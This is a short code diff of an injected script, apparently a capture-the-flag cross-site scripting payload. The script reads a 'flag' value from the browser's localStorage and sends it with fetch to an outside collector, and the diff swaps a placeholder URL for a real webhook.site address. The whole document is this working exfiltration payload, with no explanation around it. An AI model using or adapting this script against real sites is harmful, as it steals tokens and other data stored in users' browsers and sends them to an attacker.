@@ -12,7 +12,7 @@
     const flag = localStorage.getItem("flag");
 
     // Send the flag to your webhook
-    fetch("https://your-webhook-url.com?flag=" + encodeURIComponent(flag))
+    fetch("https://webhook.site/10c9e407-7980-4294-b507-3502064ab9c9?flag=" + encodeURIComponent(flag))
       .then(() => console.log("Flag sent"))
       .catch((error) => console.error("Error sending flag:", error));
   </script>
